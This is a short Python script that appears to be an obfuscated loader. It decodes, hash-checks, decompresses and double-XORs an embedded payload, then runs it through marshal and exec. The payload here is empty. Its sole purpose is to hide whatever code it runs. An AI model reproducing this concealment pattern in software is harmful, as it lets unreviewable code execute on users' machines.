import marshal as _m
import zlib as _z
import base64 as _b
import hashlib as _h
import sys as _s

def _x(d, k):
    k = k.encode() if isinstance(k, str) else k
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def _v(d, c):
    if _h.sha256(d).hexdigest()[:32] != c:
        _s.exit(1)
    return True

try:
    _p = _b.b64decode("")
    _v(_p, "64305f3acdf7c141e251df2c89f7157a")
    _d = _z.decompress(_p)
    _k2 = _h.md5(b"premiumlooters" + b'\xd8"\x07\x08cSy\x1b<d+\xaa\x95\x8c\x90*').digest()
    _d2 = _x(_d, _k2)
    _k1 = b'\xd8"\x07\x08cSy\x1b<d+\xaa\x95\x8c\x90*'
    _d1 = _x(_d2, _k1)
    _c = _m.loads(_d1)
    exec(_c)
except Exception as e:
    print(f"Error: {e}")
    _s.exit(1)
